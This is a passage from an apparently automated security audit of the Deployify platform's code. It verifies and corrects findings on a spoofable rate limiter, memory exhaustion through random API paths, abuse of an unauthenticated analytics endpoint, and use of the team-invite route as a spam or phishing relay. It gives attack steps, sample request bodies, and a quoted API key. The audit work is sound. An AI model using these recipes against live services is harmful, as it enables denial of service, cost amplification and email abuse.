**Reviewer correction.** Accurate restatement: The platform's only global rate limiter (`src/proxy.ts:116-140`, compiled as Next 16 middleware and confirmed present in `.next/server/middleware-manifest.json`) is an ineffective control reachable by any anonymous HTTP client, and its own design supplies a memory-exhaustion primitive.

Three verified defects:
1. Per-instance state. `const rateLimitStore = new Map<string, {count:number; resetAt:number}>()` (proxy.ts:21) is module-scope, so on an autoscaled Cloud Run service each instance enforces its own independent budget; effective platform-wide limit is N_instances x limit.
2. Untrusted key. `request.headers.get('x-forwarded-for')?.split(',')[0]` (proxy.ts:116) takes the leftmost, caller-asserted XFF hop. No normalization exists anywhere in the repo, and no Cloud Armor / WAF is applied to the platform front door (armor.ts targets tenant backends only). Rotating the header yields a fresh bucket.
3. Unbounded store + dead cleanup. proxy.ts's private `checkRateLimit` (lines 23-43) never deletes an entry. The exported `checkRateLimit` in `src/lib/security/index.ts:11`, which is the only copy with `cleanupExpiredEntries()`, has zero importers — dead code.

Mechanism correction (the finder's strongest path, which they missed): because the bucket key embeds the full pathname, an attacker needs no XFF spoofing at all. Requests to `/api/<long-random-string>` each create a brand-new bucket, so each is `allowed:true` and each permanently adds a key-sized entry to a Map with no eviction. At ~1-8KB per path, tens of thousands of requests approach a default 512MB Cloud Run instance's memory. The rate limiter cannot throttle the traffic that exhausts it, because the varying element is the key itself.

Scope correction: the claim's "all rate limiting" is right in spirit but the coverage gap is worse than stated — the subdomain rewrite at proxy.ts:107-111 returns before the rate-limit block, so all tenant-facing `/api/v1/proxy/*` traffic bypasses the limiter entirely, and `src/app/api/v1/collect/route.ts:11-57` carries a second, independent, equally unbounded in-memory map with the same leftmost-XFF key.

Severity correction: medium, not high. No password login exists (`src/app/api/auth/` is GitHub OAuth only: `github`, `callback`, `logout`), so there is no credential-brute-force surface behind the strict 30/min bucket; there is no authn/authz bypass and no data exposure. Impact is availability and GCP spend. The dead-code sub-finding is code quality, not a vulnerability — and adopting the shared helper would fix only the leak, not the per-instance or spoofable-key defects.

Correct fix: shared store (Memorystore/Redis) keyed on a trusted client IP (rightmost-minus-known-proxies, or GCP's documented second-to-last XFF position), bucketed on a route pattern rather than the raw pathname, with a bounded/TTL-evicting store; and move the rate-limit check above the subdomain rewrite. | Accurate restatement: `src/proxy.ts` is the only rate limiter on the control plane, and it has three separate defects — but it is a defense-in-depth control, not an access boundary, so this is medium, not high.

(1) CONFIRMED, medium: the bucket key at src/proxy.ts:116 uses `x-forwarded-for.split(',')[0]`, the attacker-supplied prefix on GCP (GFE/Cloud Run append the real client IP rather than replacing the header), so rotating the header yields a fresh 30- or 100-request bucket. The correct index is the second-from-last element. However, this defeats a control that is already non-functional at scale — the store is per-process and Cloud Run autoscales, so a plain distributed flood gets fresh buckets with no header trickery at all. Everything behind it is independently guarded: `getSession()` + `checkProjectAccess()` on data routes (src/middleware/rbac.ts:8), `timingSafeEqual` HMAC on `/api/webhooks/github` (src/lib/security/index.ts:66). The finder's PoC endpoint `/api/auth/github` only sets a CSRF cookie and 302s to GitHub — no DB, no brute-forceable secret — so the bypass yields no credential-stuffing or resource-amplification win.

(2) CONFIRMED, low-medium: `rateLimitStore` (src/proxy.ts:21) has no eviction. The proxy copy was forked from src/lib/security/index.ts and the `if (Math.random() < 0.01) cleanupExpiredEntries()` call was dropped. Genuine unbounded-growth leak, but ~100 bytes per unique `${ip}:${pathname}` key means OOM needs millions of distinct keys on a single instance, against Cloud Run's instance recycling.

(3) NOT A VULNERABILITY: `checkRateLimit` in src/lib/security/index.ts:11 is indeed unimported (verified, including multiline barrel imports and dynamic `import()`), but that is code duplication/maintainability, not a security gap — the proxy's private copy runs and does throttle. The claim's framing implies routes are unprotected; they are not.

(4) MISSED BY THE FINDER, and the stronger gap: the project-subdomain branch at src/proxy.ts:99-112 returns `NextResponse.rewrite()` BEFORE the rate-limit block at line 115. Every request to `<slug>.deployify.io` — including the Firestore-writing `logEdgeEvent` path in src/app/api/v1/proxy/[slug]/[[...path]]/route.ts — is completely unthrottled with no header manipulation required.

Fix: use the second-from-last XFF element (or Cloud Run's trusted-proxy count), move the limiter above the subdomain rewrite, and either restore `cleanupExpiredEntries()` or delete the proxy copy and import the shared helper.

**Verified code:**

```ts
src/proxy.ts:20-43 (the limiter that actually runs — no eviction anywhere):
20	// In-memory rate limit store (Edge-compatible)
21	const rateLimitStore = new Map<string, { count: number; resetAt: number }>();
22	
23	function checkRateLimit(
24	    identifier: string,
25	    limit: number = 100,
26	    windowMs: number = 60000
27	): { allowed: boolean; remaining: number; resetAt: number } {
28	    const now = Date.now();
29	    const record = rateLimitStore.get(identifier);
30	
31	    if (!record || now > record.resetAt) {
32	        const resetAt = now + windowMs;
33	        rateLimitStore.set(identifier, { count: 1, resetAt });
34	        return { allowed: true, remaining: limit - 1, resetAt };
35	    }
36	
37	    if (record.count >= limit) {
38	        return { allowed: false, remaining: 0, resetAt: record.resetAt };
39	    }
40	
41	    record.count++;
42	    return { allowed: true, remaining: limit - record.count, resetAt: record.resetAt };
43	}

src/proxy.ts:114-124 (cited line 116; key embeds attacker-controlled IP AND attacker-controlled pathname):
114	        // Rate limiting f
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** REACHABILITY: Fully confirmed, no preconditions. `.next/server/middleware-manifest.json` proves `src/proxy.ts` is compiled and wired as the Next 16 middleware with matcher `^(?:\/(_next\/data\/[^/]{1,}))?(?:\/((?!favicon.ico|public\/).*))(\\.json)?[\/#\?]?$` — it runs before routing on essentially every request. Line 116 is inside `if (pathname.startsWith('/api/'))`, so an anonymous, unauthenticated actor reaches it with a single `curl` to any `/api/*` path on the base host. No auth, no tenant, no admin, no dev env var. Dockerfile confirms `NODE_ENV=production`, `output: 'standalone'`, Cloud Run (`EXPOSE 8080`, `node server.js`), and the manifest shows the edge-runtime chunk — module-scope state is per-process, so the Map at line 21 is per-instance across an autoscaled Cloud Run service.

SUB-CLAIM 1 (per-instance in-memory): CONFIRMED. `const rateLimitStore = new Map(...)` at module scope, no Redis/Firestore/Memorystore backing. `src/lib/gcp/memorystore.ts` exists but is a tenant-provisioning feature, never used by the limiter.

SUB-CLAIM 2 (spoofable XFF): CONFIRMED as written in code — `request.headers.get('x-forwarded-for')?.split(',')[0]` takes the leftmost, i.e. the client-asserted, hop. Nothing in the repo strips or normalizes it: grep for `x-forwarded-for` returns only three sites (proxy.ts:116, collect/route.ts:28, v1/proxy route:17), all with the identical leftmost-element pattern, and `src/lib/gcp/armor.ts` (Cloud Armor) is only invoked from `src/app/api/projects/[id]/security/route.ts` against tenant backends `dfy-${serviceName}-backend`, never the platform front door. I did not independently confirm GCP's append-vs-replace behavior from a live deployment, so I discount that specific mechanism slightly — but leftmost-XFF is untrusted by definition and the code has no defense either way.

SUB-CLAIM 3 (store never shrinks + shared helper is dead): CONFIRMED. `grep -rn "checkRateLimit" src/ scripts/` returns exactly three hits: the private definition at proxy.ts:23, its single call at proxy.ts:124, and the exported definition at src/lib/security/index.ts:11 — zero importers. The exported version is the only one with `cleanupExpiredEntries()`; the copy that actually runs has no `delete`, no eviction, no size cap.

WHY I DOWNGRADE HIGH -> MEDIUM: (a) There is no password authentication anywhere — `src/app/api/auth/` contains only `github`, `callback`, `logout`, all GitHub OAuth GETs. The usual "high" justification for a rate-limit bypass (credential stuffing / login brute force) does not exist here. (b) The result is an ineffective c

</details>

### 🟡 MEDIUM — Analytics collector accepts an unbounded, untyped payload and a hardcoded bypass API key, then writes it to Firestore and streams it to BigQuery
`input-validation-dos-7` · `src/app/api/v1/collect/route.ts:66` · reported by 2 independent dimensions  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** The route is public (no session, and src/proxy.ts does not gate /api/v1/*). Line 66 accepts the literal string 'deployify-dashboard-internal' as a universal credential — it is shipped to browsers, so anyone can read it — meaning no valid project key is needed at all. None of `type`, `path`, `referrer`, `width` or `metrics` is type-checked or length-checked, and `metrics` is an arbitrary nested object written verbatim. An attacker POSTs `{"apiKey":"deployify-dashboard-internal","metrics":{"x":"<900KB string>"}}` in a loop with a randomized X-Forwarded-For header (which defeats the 20/min counter at line 53 as described in the rate-limiting finding). Each request creates a ~1MB Firestore docum

**Impact.** Unauthenticated, unmetered write and cost amplification against the platform's Firestore and BigQuery, plus permanent corruption of the analytics dataset.

**Reviewer correction.** Accurate restatement: /api/v1/collect is an anonymous-reachable ingest endpoint (confirmed: no session check in the route; src/proxy.ts authenticates only /dashboard and /new, and at lines 101-105 waves /api/v1/collect straight through on any project subdomain before its own rate limiter at line 115 ever runs). It accepts an untyped, unbounded JSON body — `type`, `path`, `referrer`, `width` and `metrics` receive no type or length check between the destructure at line 26 and the Firestore write at line 93 — and writes it verbatim to Firestore plus a fire-and-forget BigQuery streaming insert. Both rate limiters in front of it (src/proxy.ts:116, route.ts:28) key on `x-forwarded-for`.split(',')[0], which is the caller-supplied prefix on Cloud Run, and both are per-process Maps with no eviction, so neither the 100/min nor the 20/min cap survives header rotation. Result: an unauthenticated actor can drive near-1MiB Firestore documents plus BigQuery streaming inserts at will — cost amplification and analytics-dataset pollution, with a secondary unbounded-Map memory leak.

The correction to the mechanism: the hardcoded `deployify-dashboard-internal` at line 66 is NOT the enabler and is not "shipped to browsers." That literal lives only in the route and in server-only src/lib/analytics.ts:270 (firebase-admin import, no 'use client', imported by two API routes); public/deployify-insights.js has no default key and disables itself without one. What is genuinely shipped to browsers is real, valid `analyticsApiKey` values — hardcoded at src/app/layout.tsx:53 and injected into every proxied tenant page at src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:154 and :185 — so an attacker takes the legitimate getProjectByApiKey branch just as easily, and doing so is worse (it pins the forged events to a victim tenant's project rather than to 'deployify-dashboard'). Removing line 66 would not block a single request. Fix priority is therefore: bound the request body and per-field lengths, key the limiter on a trustworthy client IP (the right-hand XFF entries, or Cloud Armor), and re-scope the analytics keys — treating the magic string as the root cause would leave the exploit fully intact. Also note a payload that exceeds Firestore's 1MiB document limit throws into the catch at line 105 and returns 500, so the attacker must stay just under it. | Accurate restatement: src/app/api/v1/collect/route.ts contains a hardcoded auth-bypass constant at line 66 (`apiKey === 'deployify-dashboard-internal'`) and applies no type or length validation to `type`, `path`, `referrer`, `width`, or `metrics` before writing them to Firestore at line 93. However, the claim's mechanism is wrong on three counts and its severity is inflated.

(1) The bypass constant is NOT shipped to browsers. Its only non-route occurrence, src/lib/analytics.ts:270, sits in a server-only module (top-level firebase-admin import) in a function with zero callers — dead code that never reaches a client bundle. The browser-exposed key is a different, real one at src/app/layout.tsx:53.

(2) It is not a "universal credential." It pins `projectId = 'deployify-dashboard'` and grants no access to any tenant project — less than a real key. Because this is an analytics collector, per-project keys are public by design (injected into page HTML at proxy route lines 154/185), so the constant gives an attacker nothing they could not get by viewing source. `analyticsApiKey` is used by no other route, so its exposure is not a lateral-movement path.

(3) It is not "unbounded." Two rate limiters apply — route.ts:44-58 (20/min) and proxy.ts:118-126 (100/min) — and the BigQuery sink is type-constrained by the schema at bigquery.ts:86-108, which rejects malformed `metrics` rather than persisting it. The limiters are defeatable (they trust `x-forwarded-for.split(',')[0]`, spoofable behind GCP's LB, and are per-instance in-memory) and the proxy one is skipped for subdomain requests via the early return at proxy.ts:101 — so the correct framing is "a bypassable rate limit," not "no limit."

Residual, genuine issue: unauthenticated cost-and-noise abuse of the Firestore analytics collection with arbitrary nested `metrics` objects, capped only by Firestore's 1 MiB/20-level document limits. Recommended fixes remain worthwhile — delete the line 66 constant, add a schema with length caps on the string fields and a shape check on `metrics`, and derive the client IP from a trusted-proxy offset instead of XFF[0] so both rate limiters actually bind — but this is a low-severity hardening item, not a high-severity DoS.

**Verified code:**

```ts
src/app/api/v1/collect/route.ts (read in full, 121 lines):
  15: export async function POST(req: NextRequest) {
  25:         const body = await req.json();
  26:         const { type, path, referrer, width, metrics, apiKey } = body;
  28:         let ip = req.headers.get('x-forwarded-for')?.split(',')[0] ||
  53:         if (rateInfo.count >= RATE_LIMIT) {
  60:         if (!apiKey) {
  64:         // Verify API Key (or allow internal dashboard key)
  66:         const isInternal = apiKey === 'deployify-dashboard-internal';
  68:         if (isInternal) {
  69:             projectId = 'deployify-dashboard';
  70:         } else {
  71:             const project = await getProjectByApiKey(apiKey);
  80:         const eventData = {
  82:             type: type || 'pageview',
  83:             path: path || '/',
  84:             referrer: referrer || '',
  85:             width: width || 0,
  86:             metrics: metrics || null,
  93:         await db.collection(Collections.ANALYTICS_EVENTS).add(eventData);
  97:         streamEventToBigQuery({
 102:         }).catch(err => conso
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** REACHABILITY: confirmed. The route has no getSession/requireAuth of any kind (I read all 121 lines). src/proxy.ts gates only /dashboard and /new (lines 155-178); its matcher '/((?!favicon.ico|public/).*)' covers /api/v1/collect, but the only thing applied there on the base domain is the generic 100/min bucket at line 124. On a project subdomain the proxy returns early at lines 101-105 BEFORE reaching the rate-limit block at line 115, so /api/v1/collect via any tenant subdomain has zero proxy-level limiting. NODE_ENV=production with MOCK_DB unset changes nothing on this path (the only NODE_ENV branch in the route, line 18, merely turns BigQuery schema init ON in prod). An anonymous curl reaches line 66 and lines 93/97.

NO VALIDATION: also confirmed. Between the destructure at line 26 and the Firestore .add() at line 93 there is no typeof, no Array.isArray, no length check, no schema library (package.json has no zod/yup/joi/ajv). `metrics` is passed through verbatim to both Firestore and BigQuery. next.config.ts sets serverActions.bodySizeLimit: '2mb', which does not apply to App Router route handlers, so req.json() is bounded only by Cloud Run's 32MiB. The rate-limit keys at proxy.ts:116 and route.ts:28 are both `x-forwarded-for`.split(',')[0], i.e. the caller-supplied prefix that Google's front ends append to rather than replace, and both stores are per-process Maps with no eviction. So the "20/min" and "100/min" caps are not real mitigations. There is no Cloud Armor / WAF / LB config anywhere in the repo.

WHERE THE CLAIM IS WRONG — the headline mechanism does not hold:

(1) "it is shipped to browsers, so anyone can read it" is false for `deployify-dashboard-internal`. That literal exists in exactly two places in src/: route.ts:66 and src/lib/analytics.ts:270. analytics.ts is server-only — no 'use client', its first line imports getDb from firebase-admin, and its only two importers are src/app/api/v1/analytics/[id]/realtime/route.ts and src/app/api/projects/[id]/analytics/stats/route.ts, both server routes. It is never in a client bundle. public/deployify-insights.js (the actual browser script) has NO default key — line 10 reads the attribute and line 13-16 disables tracking entirely when it is absent.

(2) More importantly, the hardcoded key is not what makes the endpoint exploitable, so it cannot carry the severity. Real, valid project API keys are already published in plaintext HTML to every anonymous visitor: src/app/layout.tsx:53 hardcodes `data-api-key="dp_37c36f31aeca110699c7cacc6c2476f2b780ca652cc19daa"` in the dashboard's root la

</details>

### 🟡 MEDIUM — Team invite passes an unvalidated `email` value straight to Resend, which accepts an array of recipients
`input-validation-dos-8` · `src/app/api/teams/[id]/invite/route.ts:46`

**Failure scenario.** The only check on `email` is falsiness — no `typeof`, no format regex. `SendEmailOptions.to` is typed `string` but that is erased at runtime and the value originates from `await request.json()`. Resend's `emails.send` accepts `string | string[]` (up to 50 recipients per call). A user creates their own team (they are automatically owner, satisfying the owner/admin check at line 38) and POSTs `{"email":["victim1@x.com", ... 50 addresses ...],"role":"member"}`. Resend delivers the invite HTML to all 50 arbitrary third parties, `from` = the platform's verified sending domain (config.email.fromAddress). The generic proxy.ts bucket allows 100 such requests per minute per IP per instance — and that

**Impact.** The platform's verified sending domain and Resend quota become a spam relay: deliverability damage, domain blacklisting, and Resend account suspension, plus unbounded invite documents in Firestore.

**Reviewer correction.** Reachability and mechanism-of-entry are confirmed — this is not an already-admin or dev-only path. Any person with a GitHub account can reach line 70 in three requests against a production deployment (NODE_ENV=production, MOCK_DB unset): (1) GET /api/auth/callback to sign up, (2) POST /api/teams to create a team, which makes them `owner` and satisfies the line-39 gate, (3) POST /api/teams/{id}/invite with `{"email": ["a@x", ...50 addresses], "role": "member"}`, which passes the bare `if (!email)` falsiness check and lands in Resend's `to`, typed `string | string[]` in the installed resend@6.9.1.

The category is wrong. This is not a denial-of-service against Deployify — it is outbound email-relay abuse. The correct framing: an unprivileged tenant can make the platform emit up to 50 arbitrary-recipient messages per HTTP request, effectively unrate-limited because src/proxy.ts keys its bucket on `${ip}:${pathname}` and the pathname carries the team id (mint a new team, get a fresh 100/min bucket), with the store held in a per-instance in-memory Map. The damage is Resend quota burn and sending-domain reputation loss, the latter of which would break every transactional email the product sends.

The claim also understates the payload. It focuses only on `email`, but the message body is attacker-controlled too: `team.name` is unvalidated at creation (POST /api/teams regex-checks `slug` only) and src/lib/email/templates.ts interpolates it raw, unescaped, into both the subject (line 92) and the HTML body (line 111). The composite — arbitrary recipients plus arbitrary markup, SPF/DKIM-signed from noreply@deployify.io — is a working phishing relay and is high severity. I am holding the corrected severity at medium for the claim as filed, because that escalation depends on a second defect the finder did not report and because I could not confirm RESEND_API_KEY is provisioned (it is absent from `validateConfig()`'s required list, and client.ts:29-31 silently returns mock success when it is unset, which would zero the impact). These two should be fixed together: add a `typeof email !== 'string'` guard plus a format check at invite/route.ts:49, and HTML-escape `teamName` in the template. | The claim is factually correct but mislabeled. This is not an input-validation DoS; it is an authenticated outbound-email abuse (spam/phishing relay) vector. Accurate restatement: `POST /api/teams/[id]/invite` applies only a falsiness check to `email` (route.ts:49) before passing it to `sendEmail({ to: email })` (route.ts:70-71), which forwards it verbatim to `client.emails.send` (client.ts:41-43). Resend types `to` as `string | string[]` and its `parseEmailToApiOptions` performs no runtime validation, so a JSON array of up to 50 addresses yields 50 emails from one request. Any GitHub-OAuth user can self-create a team, becoming owner and satisfying the role check at lines 39-44. The impact is greater than the finder states because `team.name` is likewise unvalidated (src/app/api/teams/route.ts checks only `slug`) and is interpolated unescaped into both the subject and the HTML body (src/lib/email/templates.ts:92, 111) — so the attacker controls recipients, subject, and body markup on mail sent from the platform's verified sending domain. The only existing control is the generic 100 req/min proxy rate limit (src/proxy.ts:113-142), which is per-IP-per-pathname (widened by creating more teams, since the team id is in the path) and backed by a per-instance in-memory Map, so it caps throughput but does not mitigate the fan-out. Fix: `typeof email !== 'string'` plus a format check before line 65, and escape `teamName` in the template.

**Verified code:**

```ts
src/app/api/teams/[id]/invite/route.ts:46-54, 64-74 — the cited line and its gate:
```
46        const body = await request.json();
47        const { email, role = 'member' } = body;
48
49        if (!email) {
50            return NextResponse.json(
51                { error: 'Email is required' },
52                { status: 400, headers: securityHeaders }
53            );
54        }
...
64        const token = crypto.randomUUID();
65        const invite = await createInvite(id, email, role as TeamRole, session.user.id, token);
66
67        const inviteUrl = `${config.appUrl}/join?token=${token}`;
68        const { subject, html } = teamInviteEmail(team.name, inviteUrl);
69
70        const emailResult = await sendEmail({
71            to: email,
72            subject,
73            html,
74        });
```

src/app/api/teams/[id]/invite/route.ts:37-44 — the privilege gate the attacker satisfies by creating their own team:
```
37        const membership = await getTeamMembership(id, session.user.id);
38
39        if (!membership || (membership.role !== 'owner' && membership.role !== 
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** The claim survives on reachability. I traced a complete path from an anonymous actor to the cited line with no privileged precondition, no dev-only env var, and no dead code.

1. Signup is open. /Users/asangborkar/Documents/Plexaverse/deployify/src/app/api/auth/callback/route.ts is plain GitHub OAuth with a CSRF state check and `upsertUser(...)`. I grepped it for `allowlist|ALLOWED|whitelist|invite_only|INVITE` — zero hits. Anyone with a GitHub account becomes a tenant.

2. Owner role is self-service. POST /api/teams (src/app/api/teams/route.ts) requires only a session, a `name`, and a slug matching `/^[a-z0-9-]+$/`. `createTeam` (src/lib/db.ts:786-821) unconditionally batch-writes a `TeamMembership` with `role: 'owner'` for the caller. So the line-39 owner/admin gate in the invite route is satisfied by two HTTP calls, not by compromising an existing admin.

3. The gate on `email` is exactly what was claimed. Line 47 destructures from `await request.json()` (typed `any`, so `tsc` never sees the mismatch); line 49 is a bare `if (!email)`. A non-empty array is truthy and passes. I grepped the whole `src` tree for `isValidEmail|validateEmail|z.string().email` — zero hits anywhere in the repo, so there is no shared validator this route merely forgot to import.

4. The value reaches Resend unmodified. src/lib/email/client.ts:41-46 spreads `to` straight into `client.emails.send({from, to, subject, html})`. `SendEmailOptions.to: string` (line 22) is erased at runtime. resend@^6.9.1 is installed and node_modules/resend/dist/index.d.mts:102 and :1032 both declare `to: string | string[]`, confirming the wire API accepts an array (documented cap: 50 recipients per call).

5. Nothing in between rejects the array. `createInvite` (src/lib/db.ts:590-613) passes it through `cleanFirestoreData` (src/lib/utils.ts:166-175), which only strips `undefined` — arrays of strings are valid Firestore values, so the write succeeds and execution reaches line 70.

6. Rate limiting is not a mitigation. src/proxy.ts:124 keys the bucket on `${ip}:${pathname}`, and the pathname embeds the team id — so the attacker mints a new bucket per team, each worth 100 req/min. The store is an in-process `Map` (src/proxy.ts:21), so it also fragments across Cloud Run instances. There is no per-team or per-user invite quota anywhere in the route.

Where the claim is wrong is the label. This is filed as `input-validation-dos`, but nothing here denies service to Deployify. The realized harm is outbound: a free-tier user turns the platform into an email relay, burning the Resend quota and —

</details>

### 🟡 MEDIUM — CI never runs tests or lint — the only gate is `npm run build`, and the same workflow auto-approves and auto-merges the PR
`observability-tests-1` · `.github/workflows/auto-merge-jules.yml:33` · reported by 2 independent dimensions  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** There are exactly three workflow files (`auto-merge-jules.yml`, `cron-auto-merge.yml`, `sync-lockfile.yml`). `rg -n 'npm test|npm run test|npm run lint|eslint|playwright' .github/` returns NOTHING. So the 132 `test()`/`it()` cases in the 34 `*.test.ts` files and the `npm run lint` script are never executed by any automation — they only run when a human types them locally. Concretely: a PR from `asangzz` (the repo owner, per `git config user`) or any author matching `jules` that removes the `if (access.role === 'viewer')` guard at `src/app/api/projects/[id]/env/[envId]/reveal/route.ts:29`, or flips `src/lib/billing/payments.ts:74` `if (!webhookSecret) return false` to `return true`, still typ

**Impact.** The entire test suite and linter are decorative. Any security regression in auth, RBAC, crypto, or billing signature verification reaches production `main` with zero human or automated review. Combined with finding #3 (zero tests on those modules), there is no layer at all that would catch it.

**Reviewer correction.** Directionally correct and factually exact, but the severity and one detail need adjusting.

Accurate restatement: `.github/workflows/auto-merge-jules.yml` gates PRs on `npm run build` alone (line 34) and then, in the same job, approves the PR (line 38) and enables auto-merge (line 44). No workflow in the repo — and no other CI config, git hook, or husky setup anywhere — ever runs `npm test` or `npm run lint`, so 132 test cases across 34 `src/**/*.test.ts` files and the ESLint config are executed only when a human runs them locally. Confirmed for Next 16.2.3: the built-in ESLint-during-build integration was removed (`next/dist/lib/eslint` no longer exists), so the build genuinely does not cover lint. One correction to the framing: the build gate is not empty — `next build` still runs a full TypeScript type-check and `next.config.ts` sets neither `typescript.ignoreBuildErrors` nor `eslint.ignoreDuringBuilds`, so type errors do block the merge. The missing gates are behavioral tests and lint, not type safety.

Severity correction, high -> medium, on reachability grounds. No unprivileged actor can exploit this. The trigger is `pull_request`, not `pull_request_target`, so a fork PR from an outsider (including the over-broad `contains(login, 'jules')` substring match on line 15, which admits any account named `*jules*`) runs with a read-only `GITHUB_TOKEN` regardless of the `permissions: contents: write / pull-requests: write` block. Both `gh pr review --approve` and `gh pr merge --auto` would 403 for such a PR, and because both end in `|| echo "…"` the failure is silently swallowed and the job still reports green. The only actors who can actually get code merged are the Jules bot app, the owner `asangzz`, or a push-access collaborator — all already-trusted writers. The claimed amplifier in `cron-auto-merge.yml` (`gh pr merge --admin`, which bypasses branch protection) is also likely inert: it filters on `.statusCheckRollup.state`, but `gh pr list --json statusCheckRollup` returns an array, and indexing an array with a string is a jq error that aborts the step.

So this is a real and material engineering-controls / supply-chain gap — unreviewed, untested AI-authored code self-approving into `main` on a live PaaS whose auth, RBAC, secrets and billing paths are exactly what those 132 unrun tests cover — but it is not attacker-reachable and should not be ranked alongside an exploitable vulnerability. | Directionally correct, but restate the mechanism and lower the severity to medium.

Accurate statement: No automation in this repo ever runs `npm test` (34 files / 132 cases) or `npm run lint`. The single CI gate is `npm run build` at .github/workflows/auto-merge-jules.yml:34, and the same job then self-approves (line 38) and enables auto-merge (line 44), so a PR from `asangzz` or any login containing "jules" reaches `main` with no human review and no test execution.

Two corrections to the mechanism:
1. `npm run build` is NOT "only a build". `next build` runs a full strict-mode TypeScript check (`startTypeChecking` at node_modules/next/dist/build/index.js:826,992), `next.config.ts` sets no `typescript.ignoreBuildErrors`, and tsconfig has `strict: true` with `include: ["**/*.ts"]` excluding only node_modules — so all 34 test files are themselves type-checked by the gate. Bad imports, wrong signatures, missing exports and null-safety violations DO fail CI. What is ungated is test execution and lint. Lint is genuinely ungated because Next 16.2.3 removed the ESLint-during-build integration (`node_modules/next/dist/lint` does not exist; no lint runner anywhere in the build path) — a fact that makes the lint half of the claim stronger, not weaker.
2. `cron-auto-merge.yml` is not a second live merge vector. Line 29's jq filter indexes `.statusCheckRollup.state`, but `gh pr list --json statusCheckRollup` returns an array, so jq hard-errors ("Cannot index array with string \"state\"", reproduced locally), the step exits non-zero, and the `--squash --admin` branch-protection bypass on line 38 is never reached.

Severity medium rather than high, for three reasons the finder did not account for:
- Not attacker-reachable. The trigger is `pull_request` (not `pull_request_target`), so a fork PR gets a read-only `GITHUB_TOKEN` regardless of the `permissions:` block; the loose `contains(login, 'jules')` substring match cannot be weaponized by an outside account. This is a regression/quality gap, not a security vulnerability.
- The safety net being bypassed is thinner than implied: there is no `src/lib/auth.test.ts` and no `src/middleware/rbac.test.ts`. The 34 test files are overwhelmingly GCP wrapper and utility tests, so wiring `npm test` into CI would not currently catch JWT or `checkProjectAccess()` regressions.
- The auto-approve step is best-effort (`|| echo`) and is a no-op unless "Allow GitHub Actions to create and approve pull requests" is enabled; the merge in practice happens through `gh pr merge --auto`.

Fix remains the same and is cheap: add `npm run lint` and `npm test` steps before the Approve step in auto-merge-jules.yml, and add auth/RBAC test coverage so the gate is worth having.

**Verified code:**

```ts
/Users/asangborkar/Documents/Plexaverse/deployify/.github/workflows/auto-merge-jules.yml

  14:    # Only run for Jules PRs
  15:    if: github.event.pull_request.user.login == 'jules-google[bot]' || github.event.pull_request.user.login == 'jules[bot]' || contains(github.event.pull_request.user.login, 'jules') || github.event.pull_request.user.login == 'asangzz'
  ...
  17:    permissions:
  18:      contents: write
  19:      pull-requests: write
  ...
  30:      - name: Install dependencies
  31:        run: npm install
  32:
  33:      - name: Run build check
  34:        run: npm run build
  35:        continue-on-error: false
  36:
  37:      - name: Approve PR
  38:        run: gh pr review --approve "$PR_URL" || echo "PR could not be approved via Actions. Please ensure 'Allow GitHub Actions to create and approve pull requests' is enabled in repository settings."
  ...
  43:      - name: Enable auto-merge
  44:        run: gh pr merge --auto --squash "$PR_URL" || echo "Auto-merge could not be enabled. Please ensure 'Allow auto-merge' is enabled in repository settings."

Trigger
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** Every factual assertion in the claim reproduces exactly. I re-derived them independently rather than trusting the finder.

1. `.github/` contains exactly one directory (`workflows/`) with exactly three files: `auto-merge-jules.yml`, `cron-auto-merge.yml`, `sync-lockfile.yml`. I read all three end-to-end.
2. `grep -rniE 'npm test|npm run test|npm run lint|eslint|playwright|vitest|jest|tsc' .github/` returns NO MATCHES. There is no other CI config anywhere in the repo: no `vercel.json`, `.gitlab-ci.yml`, `Jenkinsfile`, `cloudbuild.yaml`, `.circleci`, no `.husky/`, and `.git/hooks` contains only `*.sample` files. So there is genuinely zero automation running tests or lint.
3. Counts are exact, not inflated: `find src -name '*.test.ts' | wc -l` = 34, and `grep -rhoE '^\s*(it|test)\(' --include='*.test.ts' src | wc -l` = 132. (A naive repo-wide find returns 68/264 only because `.claude/worktrees/` holds a duplicate checkout — the finder's src-scoped numbers are right.)
4. `package.json` scripts: `"lint": "eslint"`, `"test": "tsx --test --experimental-test-module-mocks $(find src -name '*.test.ts')"`. Both exist and neither string appears in any workflow.
5. The cited line is accurate. Line 33 is `- name: Run build check` and line 34 is `run: npm run build`; approve is at 38 and auto-merge at 44, in the same job, with no gate between them.

I then checked the one thing that could have refuted this — whether `npm run build` transitively covers lint or types. Installed Next is 16.2.3. `node_modules/next/dist/lib/eslint` does not exist and `node_modules/next/dist/cli/` has no `next-lint.js`: Next 16 removed the built-in ESLint integration, so `next build` does NOT run ESLint. The claim that lint never runs holds. However `next build` DOES still type-check (`dist/build/type-check.js`, `dist/lib/typescript/runTypeCheck.js` are present) and `next.config.ts` sets neither `typescript.ignoreBuildErrors` nor `eslint.ignoreDuringBuilds`. So the gate is not literally nothing — it is compile + full TypeScript type-check. That is a meaningful partial gate the claim's framing understates.

Now the reachability lens, which is where the severity is wrong. This is not a runtime code path — no HTTP request to the Next app reaches a workflow file, so "anonymous user / signed-up tenant / viewer role" is not the right actor model. The right question is who can trigger the merge, and there the guard on line 15 is over-broad but not externally exploitable:

- The `if:` admits `contains(github.event.pull_request.user.login, 'jules')` — any GitHub login containing the sub

</details>

### 🟡 MEDIUM — Zero test coverage on every security-critical module: auth, RBAC, crypto, security helpers, edge proxy, and both payment-signature verifiers
`observability-tests-3` · `src/lib/billing/payments.ts:82`  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** Inventory: 84 `route.ts` handlers under `src/app/api/**`; exactly ONE has a co-located test (`src/app/api/projects/[id]/storage/[storageId]/query/route.test.ts`) — 1/84. 39 of 62 non-test files under `src/lib` have no sibling test. `rg -ln 'lib/auth|middleware/rbac|lib/crypto|lib/security|@/proxy|billing/payments' --glob 'src/**/*.test.ts'` returns only the three `*-branching.test.ts` files, and those import `@/lib/db` solely to exercise `getEnvVarsForDeployment` under `MOCK_DB=true` — they do not test auth, RBAC, or crypto. So `src/lib/auth.ts` (JWT mint/verify, session cookie), `src/middleware/rbac.ts` (the single `checkProjectAccess` used by ~40 routes), `src/lib/crypto.ts` (AES-256-GCM s

